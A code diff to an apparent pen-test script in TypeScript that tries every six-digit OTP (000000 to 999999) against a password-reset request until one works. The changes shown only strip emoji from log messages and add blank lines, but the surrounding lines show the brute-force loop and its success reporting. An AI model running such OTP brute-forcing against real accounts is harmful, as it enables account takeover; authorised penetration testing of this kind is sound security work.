@@ -17,7 +17,7 @@ async function sendRequest(otp: string) {
     );
     
     // If we get here, we received a successful response
-    console.log(`✅ SUCCESS! OTP ${otp} worked: ${response.data.message}`);
+    console.log(`SUCCESS! OTP ${otp} worked: ${response.data.message}`);
     return { success: true, otp, message: response.data.message };
   } catch (error) {
     // Only log specific errors, not 401 (invalid OTP)
@@ -54,22 +54,24 @@ async function penTest() {
     const successfulResult = results.find(result => result.success);
     if (successfulResult) {
       foundCorrectOTP = true;
-      console.log(`🎉 Found correct OTP: ${successfulResult.otp}`);
+      console.log(`Found correct OTP: ${successfulResult.otp}`);
       break; // Exit the loop
     }
     
+
   }
   
   if (foundCorrectOTP) {
-    console.log("✅ Password reset successful!");
+    console.log("Password reset successful!");
   } else {
-    console.log("❌ Failed to find the correct OTP after trying all possibilities (000000-999999).");
+    console.log("Failed to find the correct OTP after trying all possibilities (000000-999999).");
   }
   
   return foundCorrectOTP;
 }
 
 // Run the test and handle completion
+
 penTest()
   .then(success => {
     if (success) {
